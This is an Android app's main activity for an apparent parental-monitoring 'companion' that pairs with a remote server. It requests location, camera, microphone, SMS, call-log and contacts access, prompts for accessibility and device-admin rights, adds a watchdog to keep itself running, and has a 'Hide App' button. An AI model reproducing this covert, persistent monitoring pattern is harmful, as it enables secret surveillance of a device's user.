package com.snapapp.companion;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {
    private static final int PERM_CODE = 2001;
    private EditText etPairingCode, etServerUrl;
    private Button btnActivate, btnSyncNow, btnHideApp;
    private View rowAccessibility, rowDeviceAdmin, rowNotificationAccess, rowFixBattery, rowAutoStart;
    private TextView tvStatusAccessibility, tvStatusDeviceAdmin, tvStatusNotification, tvStatusBattery, tvStatusAutoStart, tvSubAutoStart;
    private TextView tvStatus, tvChildName;
    private View cardUnpaired, cardPaired;
    private SharedPreferences prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
        bindViews();
        etServerUrl.setText(prefs.getString("server_url", "https://snap-app-chi.vercel.app"));
        checkExistingPairing();
        setupListeners();
    }

    private void bindViews() {
        etPairingCode = findViewById(R.id.etPairingCode);
        etServerUrl = findViewById(R.id.etServerUrl);
        btnActivate = findViewById(R.id.btnActivate);
        btnSyncNow = findViewById(R.id.btnSyncNow);
        btnHideApp = findViewById(R.id.btnHideApp);
        rowAccessibility = findViewById(R.id.rowAccessibility);
        rowDeviceAdmin = findViewById(R.id.rowDeviceAdmin);
        rowNotificationAccess = findViewById(R.id.rowNotificationAccess);
        rowFixBattery = findViewById(R.id.rowFixBattery);
        rowAutoStart = findViewById(R.id.rowAutoStart);
        tvStatusAccessibility = findViewById(R.id.tvStatusAccessibility);
        tvStatusDeviceAdmin = findViewById(R.id.tvStatusDeviceAdmin);
        tvStatusNotification = findViewById(R.id.tvStatusNotification);
        tvStatusBattery = findViewById(R.id.tvStatusBattery);
        tvStatusAutoStart = findViewById(R.id.tvStatusAutoStart);
        tvSubAutoStart = findViewById(R.id.tvSubAutoStart);
        tvStatus = findViewById(R.id.tvStatus);
        tvChildName = findViewById(R.id.tvChildName);
        cardUnpaired = findViewById(R.id.cardUnpaired);
        cardPaired = findViewById(R.id.cardPaired);
    }

    private void setupListeners() {
        btnActivate.setOnClickListener(v -> handleActivation());
        rowAccessibility.setOnClickListener(v -> ParentalSetupHelper.promptAccessibility(this));
        rowDeviceAdmin.setOnClickListener(v -> ParentalSetupHelper.promptDeviceAdmin(this));
        rowNotificationAccess.setOnClickListener(v -> ParentalSetupHelper.promptNotificationAccess(this));
        rowFixBattery.setOnClickListener(v -> ParentalSetupHelper.promptBatteryOptimization(this));
        rowAutoStart.setOnClickListener(v -> {
            OemPermissionHelper.openAutoStartSettings(this);
            updatePermissionViews();
        });
        btnSyncNow.setOnClickListener(v -> {
            triggerManualSync();
            Toast.makeText(this, "Live status & GPS sent!", Toast.LENGTH_SHORT).show();
        });
        btnHideApp.setOnClickListener(v -> {
            startSyncService();
            AppHideHelper.showHideDialog(this);
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        updatePermissionViews();
        if (prefs.getString("device_id", null) != null) triggerManualSync();
    }

    private void setRowStatus(TextView tv, boolean isActive, String activeText, String inactiveText) {
        if (tv == null) return;
        tv.setText(isActive ? activeText : inactiveText);
        tv.setTextColor(ContextCompat.getColor(this, isActive ? R.color.green_active : R.color.snap_yellow));
        tv.setBackgroundResource(isActive ? R.drawable.shape_status_active : R.drawable.shape_status_setup);
    }

    private void updatePermissionViews() {
        setRowStatus(tvStatusAccessibility, ParentalSetupHelper.isAccessibilityEnabled(this), "ACTIVE ✓", "ENABLE →");
        setRowStatus(tvStatusDeviceAdmin, ParentalSetupHelper.isDeviceAdminActive(this), "ACTIVE ✓", "ENABLE →");
        setRowStatus(tvStatusNotification, ParentalSetupHelper.isNotificationListenerEnabled(this), "ACTIVE ✓", "ENABLE →");
        setRowStatus(tvStatusBattery, ParentalSetupHelper.isBatteryOptimizationIgnored(this), "ACTIVE ✓", "ENABLE →");
        boolean autoStart = OemPermissionHelper.isAutoStartConfigured(this);
        setRowStatus(tvStatusAutoStart, autoStart, "CONFIGURED ✓", "SETUP →");
        if (tvSubAutoStart != null) tvSubAutoStart.setText(autoStart ? "Protected App Whitelisted" : "Huawei / OEM Launch Protection");
    }

    private void checkExistingPairing() {
        String devId = prefs.getString("device_id", null);
        if (devId != null) {
            cardUnpaired.setVisibility(View.GONE);
            cardPaired.setVisibility(View.VISIBLE);
            tvChildName.setText("Protected: " + prefs.getString("child_name", "Kid Device"));
            updatePermissionViews();
            requestPermissionsAndStart();
        } else {
            cardUnpaired.setVisibility(View.VISIBLE);
            cardPaired.setVisibility(View.GONE);
        }
    }

    private void handleActivation() {
        final String code = etPairingCode.getText().toString().trim(), server = etServerUrl.getText().toString().trim();
        if (code.length() < 4) { tvStatus.setText("Enter valid pairing code"); return; }
        tvStatus.setText("Connecting...");
        btnActivate.setEnabled(false);
        ApiClient.pairDevice(server, code, new ApiClient.ApiCallback() {
            @Override public void onSuccess(JSONObject res) {
                runOnUiThread(() -> {
                    btnActivate.setEnabled(true);
                    prefs.edit().putString("device_id", res.optString("device_id", "")).putString("child_name", res.optString("child_name", "Kid Device")).putString("server_url", server).apply();
                    Toast.makeText(MainActivity.this, "Paired Successfully!", Toast.LENGTH_LONG).show();
                    checkExistingPairing();
                });
            }
            @Override public void onError(String err) {
                runOnUiThread(() -> { btnActivate.setEnabled(true); tvStatus.setText("Error: " + err); });
            }
        });
    }

    private void triggerManualSync() {
        startSyncService();
        String devId = prefs.getString("device_id", null), server = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        if (devId != null) {
            boolean isAcc = ParentalSetupHelper.isAccessibilityEnabled(this), isAdm = ParentalSetupHelper.isDeviceAdminActive(this);
            boolean isBat = ParentalSetupHelper.isBatteryOptimizationIgnored(this);
            String ssid = WifiScanHelper.getConnectedSsid(this);
            ApiClient.sendHeartbeat(server, devId, 100, false, isAcc, isAdm, isBat, ssid, null);
        }
    }

    private void requestPermissionsAndStart() {
        java.util.List<String> list = new java.util.ArrayList<>();
        list.add(Manifest.permission.ACCESS_FINE_LOCATION);
        list.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        list.add(Manifest.permission.CAMERA);
        list.add(Manifest.permission.RECORD_AUDIO);
        list.add(Manifest.permission.READ_CONTACTS);
        list.add(Manifest.permission.READ_CALL_LOG);
        list.add(Manifest.permission.READ_SMS);
        if (Build.VERSION.SDK_INT >= 33) {
            list.add(Manifest.permission.POST_NOTIFICATIONS);
            list.add(Manifest.permission.READ_MEDIA_IMAGES);
            list.add(Manifest.permission.READ_MEDIA_VIDEO);
            list.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            list.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        boolean allGranted = true;
        for (String p : list) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) { allGranted = false; break; }
        }
        if (allGranted) startSyncService();
        else ActivityCompat.requestPermissions(this, list.toArray(new String[0]), PERM_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int rc, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(rc, perms, results);
        if (rc == PERM_CODE) startSyncService();
    }

    private void startSyncService() {
        WatchdogReceiver.scheduleWatchdog(this);
        Intent intent = new Intent(this, CompanionSyncService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent);
            else startService(intent);
        } catch (Exception ignored) {}
    }
}
